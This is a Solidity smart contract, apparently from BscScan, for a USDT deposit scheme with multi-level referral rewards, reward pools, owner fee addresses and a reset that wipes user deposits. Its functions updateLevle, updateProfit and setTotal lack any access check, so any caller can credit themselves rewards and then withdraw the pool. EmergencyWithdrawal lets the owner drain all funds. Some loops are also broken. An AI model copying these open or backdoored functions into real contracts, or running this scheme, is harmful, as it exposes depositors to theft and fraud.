/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract FFF   {
    using SafeMath for uint256; 
    address  _owner;

    IERC20 public usdt = IERC20(0x0d43B61aBE6c5aE1F41371a08da5ec26f8d74682);
    uint256 private constant baseDivider = 10000;
    uint256 private constant feePercents1 = 164; 
    uint256 private constant feePercents2 = 36; 
    uint256 public constant minDeposit = 100e18;
    uint256 public constant maxDeposit = 2000e18;
    uint256 private constant freezeIncomePercents = 3000;
    uint256 private constant timeStep = 1 hours;
    uint256 private constant dayPerCycle = 10 hours; 
    uint256 private constant dayRewardPercents = 120;
    uint256 private constant maxAddFreeze = 15 hours;
    uint256 private constant referDepth = 15;

    bool public isReset;

    uint256 public resetTime;

    uint256[4] private level4Percents = [100, 200, 300, 100];   //等级4 拿五代，等级5拿八代，等级6 10代
    uint256[5] private level5Percents = [80, 80, 80, 80, 80];
    uint256 private constant luckPoolPercents = 10;
    uint256 private constant topPoolPercents = 10;
 

    address public feeReceivers1;

    address public feeReceivers2;

    address public defaultRefer = 0xF3559Bd49B5D8de03a07342110F4E22994f514aE;

    uint256 public startTime;
    
    uint256 public lastDistribute;

    uint256 public totalUser; 

    uint256 public luckPool;

    uint256 public topPool;

    OrderInfo[] public orders;

   struct Profit {
       address user;
       uint256 profit;
   }

    mapping(uint256=>Profit[]) public dayLuckUsers;
    mapping(uint256=>uint256[]) public dayLuckUsersDeposit;
    mapping(uint256=>Profit[3]) public dayTopUsers;
    address[] public level4Users;
    struct OrderInfo {
        address user;
        uint256 amount; 
        uint256 start;
        uint256 unfreeze; 
        bool isUnfreezed;
        uint256 profit;
    }

    mapping(address => OrderInfo[]) public orderInfos;

    struct UserInfo {

        uint256 count;

        address referrer;

        uint256 start;
   
        uint256 level; 
 
        uint256 maxDeposit;
  
        uint256 totalDeposit;
   
        uint256 teamNum;
  
        uint256 maxDirectDeposit;

        uint256 teamTotalDeposit;

        uint256 totalFreezed;

        bool unfreezedDynamic;

        uint256 totalRevenue;

        uint256 orderTime;
    }

    uint256 public keepPool;

    mapping(address=>UserInfo) public userInfo;

    mapping(address=>mapping(address => uint256)) public userWheel;

    mapping(uint256 => mapping(address => uint256)) public userLayer1DayDeposit;

    mapping(address => mapping(uint256 => address[])) public teamUsers;

    struct RewardInfo{
    
        uint256 capitals;
   
        uint256 statics;
        
        uint256 directs;
       
        uint256 level4Released;

        uint256 level5Released;

        uint256 luck;

        uint256 top;

        uint256 keep;

        uint256 split;

        uint256 splitDebt;
    }

    mapping(address=>RewardInfo) public rewardInfo;
    
    

    modifier onlyOwner() {
        require(msg.sender == _owner, "Permission denied"); _;
    }

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositBySplit(address user, uint256 amount);
    event TransferBySplit(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);

    constructor() public {
       
        feeReceivers1 = 0xF3559Bd49B5D8de03a07342110F4E22994f514aE;
        feeReceivers2 = 0x1187886FADC34b11d7c2BD2F285c468A9a74329f;

        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        _owner = msg.sender;
    }
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        _owner = newOwner;
    }


    function EmergencyWithdrawal(uint256 _bal) public onlyOwner {
     usdt.transfer(msg.sender, _bal);
    }


    function register(address _referral) external {  

        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, "invalid refer");
        UserInfo storage user = userInfo[msg.sender];

        require(user.referrer == address(0), "referrer bonded");

        user.referrer = _referral; 

        user.start = block.timestamp;        

        totalUser = totalUser.add(1);
        
        emit Register(msg.sender, _referral);
    }



    function deposit(uint256 _amount) external {     
        usdt.transferFrom(msg.sender, address(this), _amount);  
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
    }

    function updateLevle(address _address,uint256 _level) external {     
        userInfo[_address].level=_level;
    }

    function updateProfit(address _address,uint256 _amount) external {     
        rewardInfo[_address].level4Released +=_amount;
    }



    function depositBySplit(uint256 _amount) external { 
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        require(userInfo[msg.sender].totalDeposit == 0, "actived");
        uint256 splitLeft = getCurSplit(msg.sender); //

        require(splitLeft >= _amount, "insufficient split");

        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);  
        
        rewardInfo[msg.sender].split = rewardInfo[msg.sender].split.sub(_amount);  
        _deposit(msg.sender, _amount);
        emit DepositBySplit(msg.sender, _amount);
    }

    function transferBySplit(address _receiver, uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");

        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        rewardInfo[msg.sender].split = rewardInfo[msg.sender].split.sub(_amount);
        rewardInfo[_receiver].split = rewardInfo[_receiver].split.add(_amount);
        emit TransferBySplit(msg.sender, _receiver, _amount);
    }


    function distributePoolRewards() private { 
        if(block.timestamp > lastDistribute.add(timeStep)){  
            uint256 dayNow = getCurDay(); 
            _distributeLuckPool(dayNow);

            _distributeTopPool(dayNow);

            
            lastDistribute = block.timestamp;
        }
    }

    function withdraw() external {

        distributePoolRewards();

        RewardInfo storage userRewards = rewardInfo[msg.sender];

        //收益 = 本金 +（1-5)级+（6-10）级 +top+luck
        uint256  withdrawable =userRewards.capitals.add(userRewards.statics).add(userRewards.level4Released).add(userRewards.luck).add(userRewards.top).add(userRewards.keep); 

        userRewards.statics = 0;

        userRewards.directs = 0;

        userRewards.level4Released = 0;

        userRewards.level5Released = 0;
        
        userRewards.luck = 0;

        userRewards.top = 0;
        
        userRewards.capitals = 0;

        userRewards.keep = 0;
      
        usdt.transfer(msg.sender, withdrawable);

        uint256 bal = usdt.balanceOf(address(this));

        if(bal<keepPool){
            checkReset();
        }

        emit Withdraw(msg.sender, withdrawable);
    }
    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function getDayLuckLength(uint256 _day) external view returns(uint256) {
        return dayLuckUsers[_day].length;
    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }
    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }

    function OrdersLength() external view returns(uint256) {
        return orders.length;
    }

 
    function getMaxFreezing(address _user) public view returns(uint256) {
        uint256 maxFreezing;
        for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze > block.timestamp){
                if(order.amount > maxFreezing){
                    maxFreezing = order.amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }


    function setTotal(address _receiver, uint256 _amount) external {
        userInfo[_receiver].totalRevenue  = _amount;
    }



    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam){
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }

    function getCurSplit(address _user) public view returns(uint256){

        (, uint256 staticSplit) = _calCurStaticRewards(_user);

        (, uint256 dynamicSplit) = _calCurDynamicRewards(_user);

        return rewardInfo[_user].split.add(staticSplit).add(dynamicSplit).sub(rewardInfo[_user].splitDebt);
    }

    function _calCurStaticRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user]; 

        uint256 totalRewards = userRewards.statics;

        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);

        uint256 withdrawable = totalRewards.sub(splitAmt);

        return(withdrawable, splitAmt);
    }

    function _calCurDynamicRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];

        uint256 totalRewards = userRewards.level4Released.add(userRewards.level5Released);

        totalRewards = totalRewards.add(userRewards.luck.add(userRewards.top));

        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _updateTeamNum(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateTopUser(address _user, uint256 _amount, uint256 _dayNow) private {
        userLayer1DayDeposit[_dayNow][_user] = userLayer1DayDeposit[_dayNow][_user].add(_amount);
        bool updated;
        for(uint256 i = 0; i < 3; i++){
            Profit storage topUser = dayTopUsers[_dayNow][i];
            if(topUser.user == _user){

                _reOrderTop(_dayNow);
                updated = true;
                break;
            }
        }
  
        if(!updated){
            Profit storage  lastUser = dayTopUsers[_dayNow][2];
            if(userLayer1DayDeposit[_dayNow][lastUser.user] < userLayer1DayDeposit[_dayNow][_user]){
                dayTopUsers[_dayNow][2].user = _user;
                _reOrderTop(_dayNow);
            }
        }
    }

    function _reOrderTop(uint256 _dayNow) private {
        for(uint256 i = 3; i > 1; i--){
            address topUser1 = dayTopUsers[_dayNow][i - 1].user;
            address topUser2 = dayTopUsers[_dayNow][i - 2].user;
            uint256 amount1 = userLayer1DayDeposit[_dayNow][topUser1];
            uint256 amount2 = userLayer1DayDeposit[_dayNow][topUser2];
            if(amount1 > amount2){
                dayTopUsers[_dayNow][i - 1].user = topUser2;
                dayTopUsers[_dayNow][i - 2].user = topUser1;
            }
        }
    }

    function _removeInvalidDeposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                if(userInfo[upline].teamTotalDeposit > _amount){
                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
                }else{
                    userInfo[upline].teamTotalDeposit = 0;
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateReferInfo(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
         
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
              
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateLevel(address _user) private {
        UserInfo storage user = userInfo[_user];
        uint256 levelNow = _calLevelNow(_user);
        if(levelNow > user.level){ 
            user.level = levelNow;
            user.count = levelNow + 2;
            if(levelNow == 4){
                level4Users.push(_user);
            }
        }
    }


    function _calLevelNow(address _user) private view returns(uint256) { 
        UserInfo storage user = userInfo[_user];
        uint256 total = user.maxDeposit;
        uint256 levelNow;
        if(total >= 100e18){
            (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);
            if(total >= 2000e18 && user.teamNum >= 30 && maxTeam >= 100000e18 && otherTeam >= 100000e18){// 等级6 200, 
            levelNow = 6;
            }
           else  if(total >= 2000e18 && user.teamNum >= 20 && maxTeam >= 50000e18 && otherTeam >= 50000e18){// 等级5 100人, 
                levelNow = 5;
            }else if(total >= 1500e18 &&user.teamNum >= 10 && maxTeam >= 10000e18 && otherTeam >= 10000e18){// 等级4 30人 
                levelNow = 4;
            }else if(total >= 1000e18 &&user.teamNum >= 5 && maxTeam >= 5000e18 && otherTeam >= 5000e18){//等级3 10人
                levelNow = 3;
        }else if(total >= 500e18 && user.teamNum >= 3 && maxTeam >= 2000e18 && otherTeam >= 2000e18 ){//等级2 5人
            levelNow = 2;
        }else if(total >= 100e18){
            levelNow = 1;
        }
        return levelNow;
    }
    }

    function _deposit(address _user, uint256 _amount) private { 
        UserInfo storage user = userInfo[_user];  
            
        require(user.referrer != address(0), "register first"); 

        require(_amount >= minDeposit, "less than min"); 
 
        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");  

        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");

        if(user.maxDeposit == 0){   
            user.maxDeposit = _amount;
        }else if(user.maxDeposit < _amount){ 
            user.maxDeposit = _amount;
        }


        _distributeDeposit(_amount); 

        if(user.totalDeposit == 0){
            uint256 dayNow = getCurDay();

            dayLuckUsers[dayNow].push(Profit(
                _user,
                0
            ));

            dayLuckUsersDeposit[dayNow].push(_amount);

            _updateTopUser(user.referrer, _amount, dayNow);
        }
        addHolder(_user);

        user.totalDeposit = user.totalDeposit.add(_amount);

        user.totalFreezed = user.totalFreezed.add(_amount);

        user.orderTime +=1;

        _updateLevel(msg.sender);

        uint256 addFreeze = (orderInfos[_user].length.div(3)).mul(timeStep);

        if(addFreeze > maxAddFreeze){
            addFreeze = maxAddFreeze;
        }

        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        uint256 profit =  _amount.mul(12).div(100).div(10000);
        orders.push(OrderInfo(
            _user,
            _amount, 
            block.timestamp, 
            unfreezeTime,
            false,
            profit
        ));
        orderInfos[_user].push(OrderInfo(
            _user,
            _amount, 
            block.timestamp, 
            unfreezeTime,
            false,
            profit
        ));

        _unfreezeFundAndUpdateReward(msg.sender, _amount);

        distributePoolRewards();

        _updateReferInfo(msg.sender, _amount);

        _updateReward(msg.sender, _amount);
        
        selfRestart(msg.sender);
    }


    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        for(uint256 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i]; 
            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && _amount >= order.amount){
            uint256 staticReward = order.profit;
            order.isUnfreezed = true;
                if(user.totalFreezed > order.amount){
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                }else{
                    user.totalFreezed = 0;
                }
                _removeInvalidDeposit(_user, order.amount);
                
                uint256 trueReward = staticReward.mul(7).div(10);
                uint256 splitReward = staticReward.sub(trueReward);
                rewardInfo[_user].split = rewardInfo[_user].split.add(splitReward);
                // if(isFreezeReward){
                //     if(user.totalFreezed > user.totalRevenue){
                //         uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);
                //         if(trueReward > leftCapital){
                //             trueReward = leftCapital;
                //         }
                //     }else{
                //         trueReward = 0;
                //     }
                // }
                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);
                rewardInfo[_user].statics = rewardInfo[_user].statics.add(trueReward);
                user.totalRevenue = user.totalRevenue.add(staticReward);
                break; 
            }
        }
    }

    function _distributeLuckPool(uint256 _dayNow) private {  
        uint256 dayDepositCount = dayLuckUsers[_dayNow - 1].length;  
        if(dayDepositCount > 0){
            uint256 checkCount = 10; 

            if(dayDepositCount < 10){
                checkCount = dayDepositCount;
            }
            uint256 totalDeposit;
            uint256 totalReward;
            for(uint256 i = dayDepositCount; i > dayDepositCount.sub(checkCount); i--){
                totalDeposit = totalDeposit.add(dayLuckUsersDeposit[_dayNow - 1][i - 1]);
            }

            for(uint256 i = dayDepositCount; i > dayDepositCount.sub(checkCount); i--){
                Profit storage   userAddr = dayLuckUsers[_dayNow - 1][i - 1];
                if(userAddr.user != address(0)){
                    uint256 reward = luckPool.mul(dayLuckUsersDeposit[_dayNow - 1][i - 1]).div(totalDeposit);
                    totalReward = totalReward.add(reward);
                    userAddr.profit =reward;
                    rewardInfo[userAddr.user].luck = rewardInfo[userAddr.user].luck.add(reward);
                    userInfo[userAddr.user].totalRevenue = userInfo[userAddr.user].totalRevenue.add(reward);
                }
            }
            if(luckPool > totalReward){
                luckPool = luckPool.sub(totalReward);
            }else{
                luckPool = 0;
            }
        }
    }
    function _distributeTopPool(uint256 _dayNow) private {
        uint16[3] memory rates = [5000, 3000, 2000];
        uint32[3] memory maxReward = [2000e6, 1000e6, 500e6];
         uint256 totalReward;
        for(uint256 i = 0; i < 3; i++){
            Profit storage   userAddr = dayTopUsers[_dayNow - 1][i];
            if(userAddr.user != address(0)){
                uint256 reward = topPool.mul(rates[i]).div(baseDivider);
                uint256 max = maxReward[i];
                if(reward > max.mul(10e12)){
                    reward = max.mul(10e12);
                }
                rewardInfo[userAddr.user].top = rewardInfo[userAddr.user].top.add(reward);
                userAddr.profit = reward;
                userInfo[userAddr.user].totalRevenue = userInfo[userAddr.user].totalRevenue.add(reward);
                totalReward = totalReward.add(reward);
            }
        }
        if(topPool > totalReward){
            topPool = topPool.sub(totalReward);
        }else{
            topPool = 0;
        }
    }
    function _distributeDeposit(uint256 _amount) private {  
        uint256 fee1 = _amount.mul(feePercents1).div(baseDivider); 
        usdt.transfer(feeReceivers1, fee1);
        uint256 fee2 = _amount.mul(feePercents2).div(baseDivider); 
        usdt.transfer(feeReceivers2, fee2);

        uint256 luck = _amount.mul(luckPoolPercents).div(baseDivider);
        luckPool = luckPool.add(luck);

        uint256 top = _amount.mul(topPoolPercents).div(baseDivider); 

        uint256 keep= _amount.mul(30).div(baseDivider);
  
        keepPool =keepPool.add(keep);
       

        topPool = topPool.add(top);
    }

    function _updateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                if(userInfo[upline].totalFreezed > userInfo[upline].totalRevenue){               
                uint256 newAmount = _amount;
                if(upline != defaultRefer){
                    uint256 maxFreezing = getMaxFreezing(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                }
                RewardInfo storage upRewards = rewardInfo[upline];
                 UserInfo storage uplineUser =    userInfo[upline];
                uint256 wheel  = userWheel[upline][_user];
                uint256 reward;
              if(i > 4){// 假设i 为5
                    if(userInfo[upline].level == 5 && i <8){
                        if(wheel<=uplineUser.count){
                        reward = newAmount.mul(level5Percents[i - 5]).div(baseDivider);
                        upRewards.split += reward;
                        uplineUser.totalRevenue += reward;
                        userWheel[upline][_user] +=1;
                        }

                    }
                    if(userInfo[upline].level == 6){
                         if(wheel<=uplineUser.count){ 
                        reward = newAmount.mul(level5Percents[i - 5]).div(baseDivider);
                        upRewards.split += reward;
                        uplineUser.totalRevenue += reward;
                         userWheel[upline][_user] +=1;    
                         }

                    }
                }else if(i <=4 && i>0){ //动态收益有轮数限制
                    if(userInfo[upline].level > 3){  
                        if(wheel<=uplineUser.count){ 
                        reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);
                        uint256 trueReward = reward.mul(7).div(10);
                        uint256 splitReward = reward.sub(trueReward);
                        upRewards.split = upRewards.split.add(splitReward);
                        upRewards.level4Released = upRewards.level4Released.add(trueReward);
                        userInfo[upline].totalRevenue  = userInfo[upline].totalRevenue.add(reward);
                         userWheel[upline][_user] +=1;    
                         }

                    }
                   else if(userInfo[upline].level==2 && i<2 ){//动态收益有轮数限制
                        if(wheel<=uplineUser.count){ 
                        reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);
                        uint256 trueReward = reward.mul(7).div(10);
                        uint256 splitReward = reward.sub(trueReward);
                        upRewards.split = upRewards.split.add(splitReward);
                        upRewards.level4Released = upRewards.level4Released.add(trueReward);
                        userInfo[upline].totalRevenue  = userInfo[upline].totalRevenue.add(reward);
                         userWheel[upline][_user] +=1;    
                         }

                    } 
                    else if(userInfo[upline].level==3 && i<3 ){//动态收益有轮数限制

                        if(wheel<=uplineUser.count){ 
                        reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);
                        uint256 trueReward = reward.mul(7).div(10);
                        uint256 splitReward = reward.sub(trueReward);
                        upRewards.split = upRewards.split.add(splitReward);
                        upRewards.level4Released = upRewards.level4Released.add(trueReward);
                        userInfo[upline].totalRevenue  = userInfo[upline].totalRevenue.add(reward);
                         userWheel[upline][_user] +=1;    
                         }

                    }
                }
                 else {
                       if(wheel<=uplineUser.count){ 
                    reward = newAmount.mul(500).div(baseDivider);
                    uint256 trueReward = reward.mul(7).div(10);
                    uint256 splitReward = reward.sub(trueReward);
                    upRewards.split = upRewards.split.add(splitReward);
                    upRewards.level4Released = upRewards.level4Released.add(trueReward);
                    userInfo[upline].totalRevenue  = userInfo[upline].totalRevenue.add(reward);
                        userWheel[upline][_user] +=1;    
                         }

                }
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function selfRestart(address _user) private returns(bool) {//个人重启机制
       UserInfo storage user= userInfo[msg.sender];
       if(user.orderTime>=48){ //开启个人重启机制
        removeOrders(_user);
        cleanUser(_user);
          return true;
       }
      return false; 
    }

    function removeOrders(address _user)private{
       if(orderInfos[_user].length>0){
        while(true){
          if(orderInfos[_user].length==0){//清除订单
            break;     
           }
           removeOrder(_user,0);
        }
    }
    }



    function cleanUser(address _user) private{
        UserInfo storage user = userInfo[_user];
           user.maxDeposit = 0;
           user.totalDeposit = 0;
           user.orderTime = 0 ;
    }

    function cleanReward(address _user) private{
        RewardInfo storage reward = rewardInfo[_user];
           reward.directs = 0 ;
           reward.level4Released = 0; 
           reward.level5Released = 0;
           reward.luck = 0 ;
           reward.top = 0;
           reward.split = 0;
           reward.splitDebt = 0;
    }

    function removeOrder(address _user,uint _index) private {
        OrderInfo[] storage ordersNew =  orderInfos[_user];
        ordersNew[_index] = ordersNew[ordersNew.length - 1];
        ordersNew.pop();
    }

    function checkReset() private{
            isReset = true;
            resetTime = block.timestamp + (3*timeStep);
            luckPool = 0;
            topPool = 0;
            disKeepPool(); 
    }

     function disKeepPool() private{
         uint256 differ = block.timestamp - (40 * timeStep);
         uint256 totalDeposit ;
         
          if(holders.length > 0){
             for(uint256 i = holders.length - 1;i >= 0 ;i--){
                uint256 userStart = userInfo[holders[i]].start;
                if(userStart>differ){
                    totalDeposit +=userInfo[holders[i]].maxDeposit;
                }else  break ;
             }
          }

          if(totalDeposit>0 && keepPool >0){
            for(uint256 i = holders.length - 1;i >= 0 ;i--){
               UserInfo storage use =  userInfo[holders[i]];
                if(use.start>differ){
                   uint256 keep =  use.maxDeposit.mul(keepPool).div(totalDeposit);
                   use.totalRevenue += keep;
                   RewardInfo storage rewards = rewardInfo[holders[i]];
                   rewards.keep = keep;
                }else  break ;
             }
          }

    }



    function systemReset()   external{
         if(isReset && block.timestamp > resetTime && holders.length>0){
          //清空所有用户
          for(uint256 i=0;i<holders.length;i++){
             cleanSystemUser(holders[i]);
             removeOrders(holders[i]);
          }
            isReset = false;
            resetTime = 0;
         }else return; 
    }

    function cleanSystemUser(address _user) private{
        UserInfo storage user = userInfo[_user];
           user.maxDeposit = 0;
           user.totalDeposit = 0;
           user.level = 0; 
           user.start = 0;
           user.orderTime = 0;
    }

    address[] public holders;
    mapping(address => uint256) holderIndex;
    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }





 
}